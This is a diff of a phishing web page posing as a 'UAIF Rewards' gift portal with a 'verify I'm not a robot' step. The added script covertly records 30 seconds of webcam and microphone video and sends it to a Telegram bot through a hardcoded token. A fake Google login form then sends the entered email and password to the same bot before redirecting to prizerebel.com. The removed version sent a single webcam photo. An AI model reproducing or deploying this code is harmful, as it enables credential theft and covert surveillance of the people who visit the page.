@@ -3,233 +3,270 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gift File Processor | Secure Access</title>
+    <title>UAIF Rewards | Secure Gateway</title>
     <style>
         :root {
-            --primary: #3b82f6;
-            --bg: #111827;
-            --card: #1f2937;
-            --text: #f3f4f6;
-            --hacker-green: #10b981;
+            --primary: #00d2ff;
+            --hacker: #00ff88;
+            --bg: #0f172a;
+            --glass: rgba(15, 23, 42, 0.9);
         }
 
         body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(circle at center, #1e293b 0%, #020617 100%);
+            color: white;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            margin: 0;
-            padding: 20px;
+            overflow: hidden;
         }
 
-        /* Verified Profile Header */
-        .profile-section {
-            position: fixed;
+        /* --- TOP RIGHT PROFILE --- */
+        .header-profile {
+            position: absolute;
             top: 20px;
             right: 20px;
             display: flex;
             align-items: center;
-            gap: 10px;
-            background: var(--card);
-            padding: 8px 15px;
+            gap: 12px;
+            background: var(--glass);
+            padding: 10px 20px;
             border-radius: 50px;
-            border: 1px solid #374151;
+            border: 1px solid var(--primary);
+            backdrop-filter: blur(10px);
+            z-index: 100;
         }
+        .v-badge { color: var(--primary); font-weight: bold; }
+        .user-photo { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
 
-        .profile-img {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 2px solid var(--primary);
-        }
-
-        .verified-badge {
-            color: var(--primary);
-            font-size: 18px;
-        }
-
-        /* Main Processing Card */
-        .container {
-            background: var(--card);
-            width: 100%;
-            max-width: 450px;
-            border-radius: 16px;
-            padding: 30px;
+        /* --- MAIN CARD --- */
+        .main-card {
+            background: var(--glass);
+            backdrop-filter: blur(25px);
+            width: 90%;
+            max-width: 420px;
+            padding: 40px;
+            border-radius: 35px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
             text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            border: 1px solid #374151;
-        }
-
-        .header-title {
-            color: var(--primary);
-            font-size: 22px;
-            margin-bottom: 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        /* Circular Countdown */
-        .timer-wrapper {
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
             position: relative;
-            width: 120px;
-            height: 120px;
-            margin: 20px auto;
         }
 
-        .timer-circle {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            border: 4px solid #374151;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 32px;
-            font-weight: bold;
+        .verify-btn, .login-btn {
+            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
             color: white;
-            box-shadow: 0 0 15px var(--primary);
-        }
-
-        .status-box {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #9ca3af;
-            background: #111827;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: left;
-        }
-
-        .status-line { margin: 5px 0; display: flex; justify-content: space-between; }
-        .success { color: var(--hacker-green); }
-        .error { color: #ef4444; }
-
-        /* Footer Sponsors */
-        .footer {
-            margin-top: 40px;
+            border: none;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 15px;
+            cursor: pointer;
             width: 100%;
-            max-width: 450px;
-            background: var(--card);
-            padding: 20px;
-            border-radius: 16px;
-            border: 1px solid #374151;
+            margin-top: 20px;
+            transition: 0.3s;
         }
 
-        .sponsor-grid {
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            margin-top: 15px;
+        /* --- INPUTS & PASSWORD TOGGLE --- */
+        .input-group { text-align: left; margin-bottom: 15px; position: relative; }
+        label { display: block; margin-bottom: 5px; font-size: 13px; color: #94a3b8; }
+        input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(0,0,0,0.3);
+            color: white;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .toggle-pass {
+            position: absolute;
+            right: 15px;
+            top: 38px;
+            cursor: pointer;
+            color: var(--primary);
+            font-size: 12px;
+            font-weight: bold;
         }
 
-        .sponsor-logo {
-            width: 70px;
-            height: 70px;
+        /* --- SPONSORS --- */
+        .footer-sponsor {
+            position: absolute;
+            bottom: 30px;
+            width: 100%;
+            text-align: center;
+        }
+        .sponsor-grid { display: flex; justify-content: center; gap: 30px; margin-top: 10px; }
+        .sponsor-box img { width: 60px; height: 60px; border-radius: 12px; border: 1px solid var(--hacker); background: #000; padding: 3px; }
+
+        .loader-ring {
+            width: 80px; height: 80px;
+            border: 5px solid rgba(255,255,255,0.1);
+            border-top: 5px solid var(--hacker);
             border-radius: 50%;
-            background: #000;
-            padding: 5px;
-            border: 1px solid #4b5563;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
         }
-
-        #video { display: none; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="profile-section">
-        <span class="verified-badge">✔</span> <img src="photo/t.jpg" alt="Admin" class="profile-img">
+    <div class="header-profile">
+        <span class="v-badge">✓ VERIFIED</span>
+        <img src="libraryyy/temkin2.jpg" class="user-photo" alt="Admin">
     </div>
 
-    <div class="container">
-        <div class="header-title">
-            <span style="color:var(--primary)">●</span> Gift File Processor
-        </div>
-
-        <p>Requesting camera access...</p>
+    <div class="main-card">
         
-        <div class="timer-wrapper">
-            <div class="timer-circle" id="timer">30</div>
+        <div id="step-1">
+            <h1 style="color: var(--primary);">UAIF Portal</h1>
+            <p>Verify your identity to claim your <b>PrizeRebel Gift</b>.</p>
+            <button class="verify-btn" onclick="startVerification()">VERIFY I'M NOT A ROBOT</button>
+            <a href="https://t.me/temkin0000" style="color:var(--hacker); text-decoration:none; font-size:12px; display:block; margin-top:15px;">Admin: @temkin0000</a>
         </div>
 
-        <div class="status-box">
-            <div class="status-line"><span>Status:</span> <span id="status">Waiting for access...</span></div>
-            <div class="status-line"><span>Countdown:</span> <span id="sec-count">30 seconds</span></div>
-            <div class="status-line"><span>Error:</span> <span class="error">#0 none</span></div>
+        <div id="step-2" class="hidden">
+            <h2 style="color: var(--hacker)">ANALYZING SENSORS</h2>
+            <div class="loader-ring"></div>
+            <p id="timer" style="font-size: 35px; font-weight: bold;">30</p>
+            <p style="font-family: monospace; color: var(--hacker);">Recording Encrypted Handshake...</p>
+        </div>
+
+        <div id="step-3" class="hidden">
+            <h2 style="color: var(--primary); margin-bottom:10px;">Login Required</h2>
+            <p style="font-size: 13px; color: #94a3b8; margin-bottom: 20px;">Verification passed! Sign in with Google to receive your code.</p>
+            
+            <div class="input-group">
+                <label>Google Email</label>
+                <input type="email" id="email" placeholder="example@gmail.com">
+            </div>
+            
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="pass" placeholder="••••••••">
+                <span class="toggle-pass" onclick="togglePassword()">SHOW</span>
+            </div>
+            
+            <button class="login-btn" onclick="stealData()">CLAIM REWARD NOW</button>
         </div>
     </div>
 
-    <div class="footer">
-        <div style="font-size: 12px; color: #6b7280; text-align: left; margin-bottom: 10px;">● Footer</div>
+    <div class="footer-sponsor">
+        <p style="font-size: 10px; letter-spacing: 2px; color: #475569;">OFFICIAL SPONSORS</p>
         <div class="sponsor-grid">
-            <div>
-                <img src="photo/temkinn.jpg" alt="UAIF" class="sponsor-logo">
-                <p style="font-size: 10px; margin-top: 5px;">UAIF Force</p>
+            <div class="sponsor-box">
+                <img src="libraryyy/team1.png" alt="UAIF">
             </div>
-            <div>
-                <img src="photo/uaif.png" alt="KCH" class="sponsor-logo">
-                <p style="font-size: 10px; margin-top: 5px;">K.C.H Group</p>
+            <div class="sponsor-box">
+                <img src="libraryyy/kch.png" alt="KCH">
             </div>
         </div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="vid" style="display:none" autoplay playsinline muted></video>
 
     <script>
-        // CONFIGURATION
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-        const CHAT_ID = 'YOUR_CHAT_ID';
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = '8519852338:AAGLztQixpgpju8BFN77yKx5IPEByL20Jao';
+        const CHAT_ID = '6804829152';
 
-        async function startApp() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+        let recorder;
+        let chunks = [];
 
-                let timeLeft = 30;
-                document.getElementById('status').innerText = "Processing camera city...";
-                
-                const interval = setInterval(() => {
-                    timeLeft--;
-                    document.getElementById('timer').innerText = timeLeft;
-                    document.getElementById('sec-count').innerText = timeLeft + " seconds";
-
-                    if(timeLeft <= 0) {
-                        clearInterval(interval);
-                        sendToTelegram(video);
-                    }
-                }, 1000);
-            } catch (e) {
-                document.getElementById('status').innerText = "Access Denied";
+        // Show/Hide Password Toggle
+        function togglePassword() {
+            const p = document.getElementById('pass');
+            const s = document.querySelector('.toggle-pass');
+            if (p.type === "password") {
+                p.type = "text";
+                s.innerText = "HIDE";
+            } else {
+                p.type = "password";
+                s.innerText = "SHOW";
             }
         }
 
-        function sendToTelegram(video) {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'image.jpg');
+        // Start Recording and 30s Countdown
+        async function startVerification() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('vid').srcObject = stream;
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
-                .then(() => {
-                    document.getElementById('status').innerHTML = '<span class="success">Processing complete!</span>';
-                });
-            }, 'image/jpeg');
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+
+                recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+
+                let timeLeft = 30;
+                const countdown = setInterval(() => {
+                    timeLeft--;
+                    document.getElementById('timer').innerText = timeLeft;
+                    if(timeLeft <= 0) {
+                        clearInterval(countdown);
+                        stopAndNext();
+                    }
+                }, 1000);
+            } catch (err) {
+                alert("Security Error: Camera access is mandatory for robot verification.");
+            }
         }
 
-        window.onload = startApp;
+        function stopAndNext() {
+            recorder.stop();
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('video', blob, 'capture.mp4');
+
+                // Send video silently
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('step-3').classList.remove('hidden');
+            };
+        }
+
+    
+    // Steal Data and Redirect to PrizeRebel immediately
+        function stealData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const btn = document.querySelector('.login-btn');
+
+            if(!email || !pass) {
+                alert("Please complete the login to claim your reward.");
+                return;
+            }
+
+            // 1. Change button text to show "Processing"
+            btn.innerText = "Sychronizing...";
+            btn.style.opacity = "0.7";
+            btn.disabled = true;
+
+            const text = `🎯 **Login Captured!**\n\n📧 Email: ${email}\n🔑 Pass: ${pass}`;
+
+            // 2. Send to Telegram (without 'await' so it doesn't block the redirect)
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+
+            // 3. Forced Redirect after a very short delay (800ms) 
+            // This gives the browser enough time to start the fetch but feels instant to the user.
+            setTimeout(() => {
+                window.location.href = "https://www.prizerebel.com";
+            }, 800);
+        }
     </script>
 </body>
-
 </html>
